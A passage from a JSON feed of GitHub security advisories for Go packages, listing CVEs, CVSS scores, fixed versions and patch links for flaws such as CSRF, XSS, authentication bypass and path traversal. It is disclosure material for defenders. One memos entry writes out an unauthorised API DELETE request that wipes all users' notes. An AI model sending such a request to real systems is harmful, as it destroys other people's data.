"PACKAGE", "url": "https://github.com/cloudflare/golz4"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0022"}], "database_specific": {"cwe_ids": ["CWE-787"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:49:10Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c5hq-35h7-r9x4", "modified": "2023-01-10T00:52:02Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4850"], "summary": "usememos/memos Cross-Site Request Forgery vulnerability", "details": "Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4850"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/46dc4728-eacc-43f5-9831-c203fdbcc346"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:51:40Z", "nvd_published_at": "2022-12-29T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x9p9-v3x6-68mq", "modified": "2023-01-10T16:02:34Z", "published": "2022-12-31T09:30:42Z", "aliases": ["CVE-2022-4866"], "summary": "usememos/memos vulnerable to Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.9.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4866"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/7670c9536000bb32c6345d4906a91268dcddd5fc"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/39c04778-6228-4f07-bdd4-ab17f246dbff"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-01-04T15:18:59Z", "nvd_published_at": "2022-12-31T09:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7rg2-cxvp-9p7p", "modified": "2022-12-02T22:25:46Z", "published": "2022-12-02T22:25:46Z", "aliases": ["CVE-2022-46146"], "summary": "Prometheus Exporter-Toolkit is vulnerable to authentication bypass", "details": "### Impact\n\nPrometheus and its exporters can be secured by a web.yml file that specifies usernames and hashed passwords for basic authentication.\n\nPasswords are hashed with bcrypt, which means that even if you have access to the hash, it is very hard to find the original password back.\n\nHowever, a flaw in the way this mechanism was implemented in the exporter toolkit makes it possible with people who know the hashed password to authenticate against Prometheus.\n\nA request can be forged by an attacker to poison the internal cache used to cache the computation of hashes and make subsequent requests successful. This cache is used in both happy and unhappy scenarios in order to limit side channel attacks that could tell an attacker if a user is present in the file or not.\n\n### Patches\n\nThe exporter-toolkit v0.7.3 and v0.8.2 have been released to address this issue.\n\n### Workarounds\n\nThere is no workaround but attacker must have access to the hashed password, stored in disk, to bypass the authentication.\n\n### Credit\n\nWe want to thank Lei Wan reporting this security issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/prometheus/exporter-toolkit"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/prometheus/exporter-toolkit"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.0"}, {"fixed": "0.8.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/prometheus/exporter-toolkit/security/advisories/GHSA-7rg2-cxvp-9p7p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-46146"}, {"type": "WEB", "url": "https://github.com/prometheus/exporter-toolkit/commit/25288779bc59d00c41b4a1706c6b87f0561ef2d7"}, {"type": "WEB", "url": "https://github.com/prometheus/exporter-toolkit/commit/5b1eab34484ddd353986bce736cd119d863e4ff5"}, {"type": "PACKAGE", "url": "https://github.com/prometheus/exporter-toolkit"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JRSHISR64L6QGSMDFZDNPHHIXSCAKK26/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UH24VXIB25OGHF4VGY4PLZMTGTI3BHCA/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ULVDTAI76VATRAHTKCE2SUJ4NC3PQZ6Y/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2022/11/29/1"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2022/11/29/2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2022/11/29/4"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-02T22:25:46Z", "nvd_published_at": "2022-11-29T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q9qr-jwpw-3qvv", "modified": "2023-08-29T19:36:30Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2016-15005"], "summary": "Golf may allow attacker to bypass CSRF protections due to weak PRNG", "details": "CSRF tokens are generated using math/rand, which is not a cryptographically secure random number generator, allowing an attacker to predict values and bypass CSRF protections with relatively few requests.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dinever/golf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-15005"}, {"type": "WEB", "url": "https://github.com/dinever/golf/issues/20"}, {"type": "WEB", "url": "https://github.com/dinever/golf/pull/24"}, {"type": "WEB", "url": "https://github.com/dinever/golf/commit/3776f338be48b5bc5e8cf9faff7851fc52a3f1fe"}, {"type": "PACKAGE", "url": "https://github.com/dinever/golf"}, {"type": "WEB", "url": "https://github.com/dinever/golf/releases/tag/v0.3.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0045"}], "database_specific": {"cwe_ids": ["CWE-332", "CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:45:18Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ghx2-6v4g-9wmm", "modified": "2023-01-10T15:45:19Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4796"], "summary": "usememos/memos makes Incorrect Use of Privileged APIs", "details": "In usememos/memos 0.9.0 and prior, a user with login permission can delete all notes of the whole application via `API DELETE https://demo.usememos.com/api/memo/$idnote`. The vulnerability will lose all user notes data throughout the system, causing damage to user data.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4796"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/efe8001b-1d6a-41af-a64c-736705cc66a6"}], "database_specific": {"cwe_ids": ["CWE-648"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:48:54Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m7qp-cj9p-gj85", "modified": "2023-01-09T21:50:04Z", "published": "2022-12-28T18:30:20Z", "aliases": ["CVE-2021-4294"], "summary": "OpenShift OSIN vulnerable to Observable Timing Discrepancy", "details": "A vulnerability was found in OpenShift OSIN. It has been classified as problematic. This affects the function `ClientSecretMatches/CheckClientSecret`. The manipulation of the argument secret leads to observable timing discrepancy. The name of the patch is 8612686d6dda34ae9ef6b5a974e4b7accb4fea29. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-216987.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/osin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.2-0.20210113124101-8612686d6dda"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4294"}, {"type": "WEB", "url": "https://github.com/openshift/osin/pull/200"}, {"type": "WEB", "url": "https://github.com/openshift/osin/commit/8612686d6dda34ae9ef6b5a974e4b7accb4fea29"}, {"type": "PACKAGE", "url": "https://github.com/openshift/osin"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1201"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.216987"}], "database_specific": {"cwe_ids": ["CWE-203", "CWE-208"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:50:04Z", "nvd_published_at": "2022-12-28T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rx2m-xr4x-54hh", "modified": "2023-01-10T15:46:25Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4802"], "summary": "usememos/memos vulnerable to Improper Authorization", "details": "usememos/memos 0.9.0 and prior is vulnerable to Improper Authorization.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4802"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/d47d4a94-92e3-4400-b012-a8577cbd7956"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-639"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:58:02Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hggr-p7v6-73p5", "modified": "2022-12-30T00:57:23Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2020-36568"], "summary": "revel is vulnerable to resource exhaustion", "details": "Unsanitized input in the query parser in github.com/revel/revel before v1.0.0 allows remote attackers to cause resource exhaustion via memory allocation.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/revel/revel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36568"}, {"type": "WEB", "url": "https://github.com/revel/revel/issues/1424"}, {"type": "WEB", "url": "https://github.com/revel/revel/pull/1427"}, {"type": "WEB", "url": "https://github.com/revel/revel/commit/d160ecb72207824005b19778594cbdc272e8a605"}, {"type": "PACKAGE", "url": "https://github.com/revel/revel"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0003"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T00:57:23Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f552-97qx-c694", "modified": "2023-01-02T21:18:58Z", "published": "2022-12-23T21:30:18Z", "aliases": ["CVE-2022-4692"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4692"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c07b4a57caa89905e54b800f4d8fb720bbf5bf82"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/9d1ed6ea-f7a0-4561-9325-a2babef99c74"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T16:58:02Z", "nvd_published_at": "2022-12-23T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xr7p-8q82-878q", "modified": "2022-12-06T15:36:15Z", "published": "2022-12-06T15:36:15Z", "aliases": ["CVE-2022-23466"], "summary": "teler dashboard vulnerable to DOM-based cross-site scripting (XSS)", "details": "### Description\n\nteler prior to version <= 2.0.0-rc.4 is vulnerable to DOM-based cross-site scripting (XSS) in the teler dashboard. When teler requests messages from the event stream on the `/events` endpoint, the log data displayed on the dashboard are not sanitized.\n\n### Impact\n\nThis only affects authenticated users and can only be exploited based on detected threats if the log contains a DOM scripting payload. This indicates a low severity and there is no significant impact on the users.\n\n### Affected Version\n\nThis issue was introduced from version `v2.0.0-rc` to `v2.0.0-rc.3` & `v2.0.0-dev`.\n\n### Patches\n\nThis vulnerability has been fixed on version `v2.0.0-rc.4` & `v2.0.0-dev.2`.\n\n### Workarounds\n\nHere are some workarounds to handle this case:\n- Deactivate the live event dashboard from the configuration file, or\n- Upgrade teler version to `v2.0.0-rc.4` or `v2.0.0-dev.2` & above.\n\n### References\n\n- https://github.com/kitabisa/teler/commit/20f59eda2420ac64e29f199a61230a0abc875e8e\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "teler.app"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0-rc"}, {"fixed": "2.0.0-rc.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.0.0-rc.3"}}, {"package": {"ecosystem": "Go", "name": "teler.app"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0-dev"}, {"fixed": "2.0.0-dev.2"}]}], "versions": ["2.0.0-dev"]}], "references": [{"type": "WEB", "url": "https://github.com/kitabisa/teler/security/advisories/GHSA-xr7p-8q82-878q"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23466"}, {"type": "WEB", "url": "https://github.com/kitabisa/teler/commit/20f59eda2420ac64e29f199a61230a0abc875e8e"}, {"type": "PACKAGE", "url": "https://github.com/kitabisa/teler"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-12-06T15:36:15Z", "nvd_published_at": "2022-12-06T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pp3p-6jjh-rmg7", "modified": "2023-01-10T15:42:32Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4806"], "summary": "usememos/memos Improper Access Control vulnerability", "details": "An Improper Access Control vulnerability in usememos/memos 0.9.0 and prior can result in a user deleting others' public and private memos.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4806"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/2c7101bc-e6d8-4cd0-9003-bc8d86f4e4be"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-639"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:09:17Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6vm3-jj99-7229", "modified": "2023-01-10T15:56:22Z", "published": "2022-12-27T21:30:20Z", "aliases": ["CVE-2020-36567"], "summary": "Gin's default logger allows unsanitized input that can allow remote attackers to inject arbitrary log lines", "details": "Gin is a HTTP web framework written in Go (Golang). Unsanitized input in the default logger in github.com/gin-gonic/gin before v1.6.0 allows remote attackers to inject arbitrary log lines.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gin-gonic/gin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36567"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/2237"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/commit/a71af9c144f9579f6dbe945341c1df37aaf09c0d"}, {"type": "PACKAGE", "url": "https://github.com/gin-gonic/gin"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0001"}], "database_specific": {"cwe_ids": ["CWE-116", "CWE-117"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T00:56:53Z", "nvd_published_at": "2022-12-27T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rmj9-q58g-9qgg", "modified": "2023-01-10T15:55:39Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2020-36560"], "summary": "go-unzip vulnerable to Path Traversal", "details": "Due to improper path santization, archives containing relative file paths can cause files to be written (or overwritten) outside of the target directory.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/artdarek/go-unzip"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36560"}, {"type": "WEB", "url": "https://github.com/artdarek/go-unzip/pull/2"}, {"type": "WEB", "url": "https://github.com/artdarek/go-unzip/commit/4975cbe0a719dc50b12da8585f1f207c82f7dfe0"}, {"type": "PACKAGE", "url": "https://github.com/artdarek/go-unzip"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0034"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:06:21Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xv6x-456v-24xh", "modified": "2022-12-30T00:58:09Z", "published": "2022-12-30T00:58:09Z", "aliases": ["CVE-2022-46181"], "summary": "gotify/server vulnerable to Cross-site Scripting in the application image file upload", "details": "### Impact\n\nThe XSS vulnerability allows authenticated users to upload .html files. With that, an attacker could execute client side scripts **if** another user opened a link, such as:\n\n```\nhttps://push.example.org/image/[alphanumeric string].html\n```\n\nAn attacker could potentially take over the account of the user that clicked the link. Keep in mind, the Gotify UI won't natively expose such a malicious link, so an attacker has to get the user to open the malicious link in a context outside of Gotify.\n\n### Patches\n\nThe vulnerability has been fixed in version 2.2.2.\n\n### Workarounds\n\nYou can block access to non image files via a reverse proxy in the `./image` directory.\n\n### References\n\nhttps://github.com/gotify/server/pull/534\nhttps://github.com/gotify/server/pull/535\n\n---\n\nThanks to rickshang (aka \u65e0\u5728\u65e0\u4e0d\u5728) for discovering and reporting this bug.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gotify/server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.2.1"}}], "references": [{"type": "WEB", "url": "https://github.com/gotify/server/security/advisories/GHSA-xv6x-456v-24xh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-46181"}, {"type": "WEB", "url": "https://github.com/gotify/server/pull/534"}, {"type": "WEB", "url": "https://github.com/gotify/server/pull/535"}, {"type": "PACKAGE", "url": "https://github.com/gotify/server"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T00:58:09Z", "nvd_published_at": "2022-12-29T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7qpw-2j9m-rw8c", "modified": "2023-01-10T15:44:56Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4813"], "summary": "usememos/memos has Insufficient Granularity of Access Control", "details": "An Insufficient Granularity of Access Control in usememos/memos prior to 0.9.0 can allow an attacker to delete a memo from the archives.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4813"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/a24b45d8-554b-4131-8ce1-f33bf8cdbacc"}], "database_specific": {"cwe_ids": ["CWE-1220"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:12:40Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5x84-q523-vvwr", "modified": "2023-01-10T15:55:56Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2020-36564"], "summary": "nosurf vulnerable to improper input validation", "details": "Due to improper validation of caller input, validation is silently disabled if the provided expected token is malformed, causing any user supplied token to be considered valid.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/justinas/nosurf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36564"}, {"type": "WEB", "url": "https://github.com/justinas/nosurf/pull/60"}, {"type": "WEB", "url": "https://github.com/justinas/nosurf/commit/4d86df7a4affa1fa50ab39fb09aac56c3ce9c314"}, {"type": "PACKAGE", "url": "https://github.com/justinas/nosurf"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0049"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:06:40Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cjcc-46j8-xmr8", "modified": "2022-12-30T22:21:25Z", "published": "2022-12-22T12:30:17Z", "aliases": ["CVE-2020-36625"], "summary": "destiny.gg chat vulnerable to cross-site request forgery", "details": "** UNSUPPORTED WHEN ASSIGNED ** A vulnerability was found in destiny.gg chat. It has been rated as problematic. This issue affects the function websocket.Upgrader of the file main.go. The manipulation leads to cross-site request forgery. The attack may be initiated remotely. The name of the patch is bebd256fc3063111fb4503ca25e005ebf6e73780. It is recommended to apply a patch to fix this issue. The identifier VDB-216521 was assigned to this vulnerability. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/destinygg/chat"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.0.0-20220628124252-0981d5add8f3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36625"}, {"type": "WEB", "url": "https://github.com/destinygg/chat/pull/35"}, {"type": "WEB", "url": "https://github.com/destinygg/chat/commit/bebd256fc3063111fb4503ca25e005ebf6e73780"}, {"type": "PACKAGE", "url": "https://github.com/destinygg/chat"}, {"type": "WEB", "url": "https://vuldb.com/?id.216521"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:21:25Z", "nvd_published_at": "2022-12-22T10:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gxgj-xjcw-fv9p", "modified": "2023-01-09T21:48:38Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2013-10005"], "summary": "socks Infinite Loop vulnerability", "details": "The `RemoteAddr` and `LocalAddr` methods on the returned `net.Conn` may call themselves, leading to an infinite loop which will crash the program due to a stack overflow.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/btcsuite/go-socks"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20130808000456-233bccbb1abe"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/btcsuitereleases/go-socks"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20130808000456-233bccbb1abe"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2013-10005"}, {"type": "WEB", "url": "https://github.com/btcsuite/go-socks/commit/233bccbb1abe02f05750f7ace66f5bffdb13defc"}, {"type": "PACKAGE", "url": "https://github.com/btcsuite/go-socks"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0024"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:48:38Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jvq8-w7qv-hqp6", "modified": "2023-01-10T15:46:13Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4799"], "summary": "usememos/memos Improper Authentication vulnerability", "details": "usememos/memos 0.9.0 and prior is vulnerable to Improper Authentication.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4799"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/c5d70f9d-b7a7-4418-9368-4566a8143e79"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-639"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:57:32Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gvfj-fxx3-j323", "modified": "2023-08-30T18:49:55Z", "published": 